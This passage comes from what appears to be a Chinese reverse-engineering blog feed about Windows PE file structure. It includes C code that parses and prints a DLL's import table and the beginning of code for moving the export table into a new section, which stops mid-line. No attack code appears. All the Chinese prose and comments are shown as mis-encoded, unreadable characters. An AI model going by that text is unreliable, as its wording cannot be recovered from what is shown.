class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_BY_NAME</span> &#123;</span><br>    WORD    Hint;<span class="hljs-comment">//å¯èƒ½ä¸ºç©ºï¼Œç¼–è¯‘å™¨å†³å®š å¦‚æœä¸ä¸ºç©º æ˜¯å‡½æ•°åœ¨å¯¼å‡ºè¡¨ä¸­çš„ç´¢å¼•</span><br>    BYTE    Name[<span class="hljs-number">1</span>];    <span class="hljs-comment">//å‡½æ•°åç§°ï¼Œä»¥0ç»“å°¾</span><br>&#125; IMAGE_IMPORT_BY_NAME<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªæˆå‘˜å°±æŒ‡å‘åå­—çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚</p><p>IATè¡¨å’ŒINTè¡¨åœ¨åŠ è½½å‰æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œå…¶ç»“æ„ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå®ƒä»¬çš„æˆå‘˜éƒ½ä¼šæŒ‡å‘ç›¸åŒçš„åºå·æˆ–è€…IMAGE_IMPORT_BY_NAMEç»“æ„</p><h2 id="ä»£ç éå†"><a href="#ä»£ç éå†" class="headerlink" title="ä»£ç éå†"></a>ä»£ç éå†</h2><p>NOTEï¼šæˆ‘ä½¿ç”¨çš„PEæ–‡ä»¶æ˜¯64ä½çš„ï¼Œåœ¨å¤„ç†ä¸Šä¼šç•¥æœ‰æ‰€ä¸åŒã€‚ä¼šåœ¨ä»£ç ä¸­æ ‡å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> RVA;<br>&#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(RVA &gt;= SectionHeader-&gt;VirtualAddress &amp;&amp; RVA &lt; (SectionHeader+<span class="hljs-number">1</span>)-&gt;VirtualAddress)&#123;<br>            DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader +=<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>     <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = RVA - SectionHeader-&gt;VirtualAddress;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;PointerToRawData + offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Import_INFO</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>     <span class="hljs-comment">//å¦‚æœæ˜¯æŸ¥çœ‹32ä½çš„PEæ–‡ä»¶ è¿™é‡Œæ”¹ä¸ºPIMAGE_OPTIONAL_HEADER6432</span><br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>                     <span class="hljs-comment">//å¦‚æœæ˜¯æŸ¥çœ‹32ä½çš„PEæ–‡ä»¶ è¿™é‡Œæ”¹ä¸ºPIMAGE_OPTIONAL_HEADER6432</span><br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>PIMAGE_IMPORT_BY_NAME ImportByName=<span class="hljs-literal">NULL</span>;<br>PIMAGE_IMPORT_DESCRIPTOR Import_Table = (PIMAGE_IMPORT_DESCRIPTOR)(Buffer + RVA_TO_FOA(OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,Buffer));<br><span class="hljs-comment">//ç”¨äºç¡®å®šå¯¼å…¥è¡¨çš„ç»“æŸ</span><br><span class="hljs-type">char</span> ZERO[<span class="hljs-keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR)] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-built_in">memcmp</span>(ZERO,Import_Table,<span class="hljs-keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;----------ç¬¬ %d ä¸ªå¯¼å…¥è¡¨----------\n&quot;</span>,i);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Time Date Stamp:%X\n&quot;</span>,Import_Table-&gt;TimeDateStamp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dll name:%s\n&quot;</span>,(Buffer + RVA_TO_FOA(Import_Table-&gt;Name,Buffer)));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INT RVA:%X\n&quot;</span>,Import_Table-&gt;OriginalFirstThunk);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IAT RVA:%X\n&quot;</span>,Import_Table-&gt;FirstThunk);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******INT TABLE******\n&quot;</span>);<br>         <span class="hljs-comment">//å¦‚æœæ˜¯æŸ¥çœ‹32ä½çš„PEæ–‡ä»¶ è¿™é‡Œæ”¹ä¸ºDWORD*</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* INT_Address = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(Buffer + RVA_TO_FOA(Import_Table-&gt;OriginalFirstThunk,Buffer));<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; *INT_Address ;j++)&#123;<br><span class="hljs-comment">//æœ€é«˜ä½æ˜¯1 åˆ™æ˜¯åºå·å¯¼å‡º ////å¦‚æœæ˜¯æŸ¥çœ‹32ä½çš„PEæ–‡ä»¶ è¿™é‡Œæ”¹ä¸º0x80000000</span><br><span class="hljs-keyword">if</span>(((*INT_Address) &amp; <span class="hljs-number">0x8000000000000000</span>))&#123;         <span class="hljs-comment">// è¿™é‡Œæ”¹ä¸º0x7fffffff   </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå‡½æ•°åºå·ä¸º:%d\n&quot;</span>,j,(*INT_Address) &amp; <span class="hljs-number">0x7fffffffffffffff</span>);<br>&#125;<br><span class="hljs-comment">//å¦åˆ™æ˜¯åç§»æŒ‡å‘å¦ä¸€ä¸ªç»“æ„</span><br><span class="hljs-keyword">else</span>&#123;<br>ImportByName = (PIMAGE_IMPORT_BY_NAME)(Buffer + RVA_TO_FOA(*(INT_Address),Buffer));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå‡½æ•°åå­—ä¸º:%s\n&quot;</span>,j,ImportByName-&gt;Name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;INT_ADDRESS:%X \n&quot;</span>,*INT_Address);<br>&#125;<br><br>INT_Address++;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;******IAT TABLE******\n&quot;</span>);<br>        <span class="hljs-comment">//å¦‚æœæ˜¯æŸ¥çœ‹32ä½çš„PEæ–‡ä»¶ è¿™é‡Œæ”¹ä¸ºDWORD*</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span>* IAT_Address = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(Buffer + RVA_TO_FOA(Import_Table-&gt;FirstThunk,Buffer));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; *IAT_Address ;j++)&#123;<br><span class="hljs-comment">//æœ€é«˜ä½æ˜¯1 åˆ™æ˜¯åºå·å¯¼å‡º è¿™é‡Œæ”¹ä¸º0x80000000</span><br><span class="hljs-keyword">if</span>((*IAT_Address) &amp; <span class="hljs-number">0x8000000000000000</span>)&#123;           <span class="hljs-comment">// è¿™é‡Œæ”¹ä¸º0x7fffffff  </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå‡½æ•°åºå·ä¸º:%d\n&quot;</span>,j,(*IAT_Address) &amp; <span class="hljs-number">0x7fffffffffffffff</span>);<br>&#125;<br><span class="hljs-comment">//å¦åˆ™æ˜¯åç§»æŒ‡å‘å¦ä¸€ä¸ªç»“æ„</span><br><span class="hljs-keyword">else</span>&#123;<br>ImportByName = (PIMAGE_IMPORT_BY_NAME)(Buffer + RVA_TO_FOA(*IAT_Address,Buffer));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç¬¬%dä¸ªå‡½æ•°åå­—ä¸º:%s\n&quot;</span>,j,ImportByName-&gt;Name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IAT_ADDRESS:%X \n&quot;</span>,*IAT_Address);<br>&#125;<br>IAT_Address++;<br>&#125;<br><br>Import_Table++;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------\n&quot;</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\Func.dll&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    <span class="hljs-comment">//å°†æ–‡ä»¶è¯»å–åˆ°ç¨‹åºä¸­</span><br>    <span class="hljs-type">int</span> size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>Import_INFO(buffer);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>PEåŠ è½½å‰ï¼ŒINTè¡¨å’ŒIATè¡¨å­˜æ”¾äº†ç›¸åŒçš„å€¼æŒ‡å‘åŒä¸€å¤„åœ°æ–¹ï¼Œæˆ–ä¸ºå‡½æ•°åºå·ã€æˆ–ä¸ºå‡½æ•°åç§°ã€‚</p><p>PEåŠ è½½åï¼Œæ“ä½œç³»ç»Ÿæ ¹æ®INTè¡¨æ‰¾åˆ°å„ä¸ªDLLä¸­æ¯ä¸ªå‡½æ•°çš„å…·ä½“åœ°å€ï¼Œå°†å…¶å¡«å…¥IATä¸­ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142354979.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆä¹ï¼‰</title>
    <link href="/2023/07/12/PE_8/"/>
    <url>/2023/07/12/PE_8/</url>
    
    <content type="html"><![CDATA[<p>PEæ–‡ä»¶ç»ƒä¹ </p><p>ç§»åŠ¨å¯¼å‡ºè¡¨ã€é‡å®šä½è¡¨ã€æ‰‹åŠ¨ä¿®å¤é‡å®šä½è¡¨</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>å¯¼å‡ºè¡¨æ˜¯å‘Šè¯‰å…¶ä»–PEæ–‡ä»¶æœ¬èº«å¯ä»¥æä¾›ä»€ä¹ˆå‡½æ•°ï¼Œå¹¶ä¸”æä¾›åå­—ç´¢å¼•å’Œåºå·ç´¢å¼•ä¸¤ç§æ–¹å¼æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°åœ°å€ã€‚å¯¼å‡ºè¡¨ä¸‹åˆæŒ‡å‘äº†ä¸‰å¼ æ–°è¡¨ï¼Œåˆ†åˆ«æ˜¯å‡½æ•°åœ°å€è¡¨ï¼Œåºå·è¡¨ï¼Œåç§°è¡¨ã€‚</p><p>é‡å®šä½è¡¨æ˜¯åœ¨PEæ–‡ä»¶æ— æ³•æŒ‰ç…§é¢„è®¡ImageBaseè£…è½½æ—¶ï¼Œæä¾›æ‰€æœ‰éœ€è¦ä¿®æ”¹åœ°å€çš„ä¸€å¼ è¡¨ã€‚å› ä¸ºç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ–‡ä»¶æ—¶ä¼šæŒ‰ç…§é¢„è®¡ImageBaseè®¡ç®—æ‰€æœ‰åœ°å€ï¼Œä»¥ç¡¬ç¼–ç æ–¹å¼ç”Ÿæˆï¼Œé‚£ä¹ˆåœ¨ImageBaseæ— æ³•æ­£ç¡®è£…è½½æ—¶ï¼Œè¿™äº›ç¡¬ç¼–ç åœ°å€å°±éœ€è¦æ›´æ”¹ï¼Œé‡å®šä½è¡¨å°±è´Ÿè´£æä¾›è¿™äº›ç¡¬ç¼–ç åœ°å€ã€‚</p><p>ç°åœ¨å°±å°è¯•å»ç§»åŠ¨è¿™ä¸¤å¼ è¡¨ï¼Œå¹¶æ ¹æ®é‡å®šä½è¡¨åŸç†æ‰‹åŠ¨ä¿®å¤ä¸€ä¸‹ã€‚</p><h2 id="ç§»åŠ¨å¯¼å‡ºè¡¨"><a href="#ç§»åŠ¨å¯¼å‡ºè¡¨" class="headerlink" title="ç§»åŠ¨å¯¼å‡ºè¡¨"></a>ç§»åŠ¨å¯¼å‡ºè¡¨</h2><p>å…ˆæ¥çœ‹çœ‹å¯¼å‡ºè¡¨çš„ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br>        DWORD   Characteristics;<span class="hljs-comment">//æ²¡ç”¨</span><br>        DWORD   TimeDateStamp;<span class="hljs-comment">//æ—¶é—´æˆ³</span><br>        WORD    MajorVersion;<span class="hljs-comment">//æ²¡ç”¨</span><br>        WORD    MinorVersion;<span class="hljs-comment">//æ²¡ç”¨</span><br>        DWORD   Name;<span class="hljs-comment">//æŒ‡å‘å¯¼å‡ºè¡¨æ–‡ä»¶å RVA --&gt;FOA+FileBuff=char *name;</span><br>        DWORD   Base;<span class="hljs-comment">//å¯¼å‡ºå‡½æ•°èµ·å§‹åºå·</span><br>        DWORD   NumberOfFunctions;<span class="hljs-comment">//å¯¼å‡ºå‡½æ•°ä¸ªæ•°</span><br>        DWORD   NumberOfNames;<span class="hljs-comment">//ä»¥åç§°å¯¼å‡ºå‡½æ•°ä¸ªæ•°</span><br>        DWORD   AddressOfFunctions;<span class="hljs-comment">//å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ RVA--&gt;FOA +FileBuff         </span><br>DWORD   AddressOfNames;    <span class="hljs-comment">//å¯¼å‡ºå‡½æ•°åç§°è¡¨     // RVA from base of image</span><br>        DWORD   AddressOfNameOrdinals; <span class="hljs-comment">//å¯¼å‡ºå‡½æ•°åºå·è¡¨ // RVA from base of image</span><br>&#125; IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ AddressOfFunctionsã€AddressOfNamesã€AddressOfNameOrdinalså¯¹åº”ä¸‰å¼ è¡¨çš„åœ°å€ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307072016159.png"></p><p>æˆ‘ä»¬ç›®æ ‡å°±æ˜¯æŠŠè¿™ä¸‰å¼ è¡¨ç§»åŠ¨ä¸€ä¸ªæ–°çš„èŠ‚åŒºï¼Œå†æŠŠå¯¼å‡ºè¡¨ç»“æ„æ”¾åˆ°è¿™ä¸‰å¼ è¡¨åé¢ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307120055868.png"></p><p>å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤æ¥ç§»åŠ¨</p><blockquote><p>1.åˆ›å»ºä¸€ä¸ªæ–°çš„èŠ‚åŒº</p><p>2.å°†å‡½æ•°åœ°å€è¡¨ï¼Œå³AddressOfFunctionså¯¹åº”çš„è¡¨ç§»åˆ°æ–°èŠ‚åŒºå¼€å¤´ï¼Œå¹¶å°†åŸAddressOfFunctionsè¿›è¡Œä¿®æ­£</p><p>3.å°†å‡½æ•°åºå·è¡¨ï¼Œå³AddressOfNameOrdinalså¯¹åº”çš„è¡¨æ¥ç»­ç§»åˆ°æ–°èŠ‚åŒºï¼Œå¹¶å°†åŸAddressOfNameOrdinalsè¿›è¡Œä¿®æ­£</p><p>4.å°†å‡½æ•°åç§°è¡¨ï¼Œå³AddressOfNameså¯¹åº”çš„è¡¨æ¥ç»­ç§»åˆ°æ–°èŠ‚åŒºï¼Œå¹¶å°†åŸAddressOfNamesè¿›è¡Œä¿®æ­£</p><p>5.å°†å‡½æ•°åç§°è¡¨å¯¹åº”çš„æ‰€æœ‰åå­—æ¥ç»­ç§»åˆ°æ–°èŠ‚åŒºï¼Œå¹¶æŠŠå‡½æ•°åç§°è¡¨é‡Œåœ°å€è¿›è¡Œä¿®æ­£</p><p>6.å°†æ•´ä¸ªå¯¼å‡ºè¡¨æ¥ç»­ç§»åˆ°æ–°èŠ‚åŒºï¼Œå¹¶æŠŠåŸæ¥çš„Directoryç›®å½•é¡¹è¿›è¡Œä¿®æ­£</p></blockquote><p>NOTEï¼š</p><p>1.éœ€è¦ä¸»è¦å„ç§åœ°å€ä¹‹é—´çš„è½¬åŒ–ï¼Œæ˜¯RVAè¿˜æ˜¯FOA</p><p>2.éœ€è¦ä¸»è¦å„ç§æŒ‡é’ˆç±»å‹ä¹‹é—´çš„è½¬åŒ–ï¼Œè¿™åœ¨æŒ‡é’ˆè¿ç®—ä¸­ååˆ†é‡è¦</p><p>3.å¯ä»¥å°è¯•ä½¿ç”¨æ–°ç§»åŠ¨åçš„dllï¼ŒéªŒè¯æ˜¯å¦æˆåŠŸç§»åŠ¨</p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>ä»£ç ä¸­ä¼šæœ‰è¯¦ç»†æ³¨é‡Šï¼Œä»…ç»™å‡ºç§»åŠ¨å¯¼å‡ºè¡¨å‡½æ•°å®ç°ï¼Œå…¶ä½™å‡½æ•°å·²åœ¨å…¶ä½™æ–‡ç« ä¸­æœ‰å®ç°ï¼Œä¸å†é‡å¤ç»™å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Move_ExportTable</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER64 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER New_SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br>New_SectionHeader=(PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER +IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>) + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>DWORD Export_DATA_RVA = OptionalHeader-&gt;DataDirectory[<span class="hljs-number">0</span>].VirtualAddress;<br>DWORD Export_DATA_FOA = RVA_TO_FOA(Export_DATA_RVA, Buffer);<br>PIMAGE_EXPORT_DIRECTORY Export_Table = (PIMAGE_EXPORT_DIRECTORY)(Export_DATA_FOA + Buffer);<br><br>    <span class="hljs-comment">//ç”¨æ¥è®°å½•åœ¨æ–°èŠ‚åŒºä¸­åç§»ï¼Œå°±æ˜¯å·²ç»å¤åˆ¶äº†å¤šå°‘ä¸ªå­—èŠ‚</span><br>    DWORD index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span>* New_Sec = New_SectionHeader-&gt;PointerToRawData + Buffer;<br><br>    <span class="hljs-comment">//å®šä½åˆ°å‡½æ•°åœ°å€è¡¨ï¼Œä½¿ç”¨char*ç±»å‹æŒ‡é’ˆå³å¯ï¼Œå› ä¸ºä¸éœ€è¦å¯¹å…¶å…·ä½“æ±‚å€¼ï¼Œåªéœ€è¦æŒ‰å­—èŠ‚å¤åˆ¶</span><br>    <span class="hljs-type">char</span>* AddressOfFunctions = Buffer + RVA_TO_FOA(Export_Table-&gt;AddressOfFunctions,Buffer);<br>    <span class="hljs-comment">//å¤åˆ¶å‡½æ•°åœ°å€è¡¨ï¼Œæ¯ä¸ªåœ°å€è¡¨è¡¨é¡¹éƒ½å 4ä¸ªå­—èŠ‚</span><br>    <span class="hljs-built_in">memcpy</span>(New_Sec, AddressOfFunctions, Export_Table-&gt;NumberOfFunctions * <span 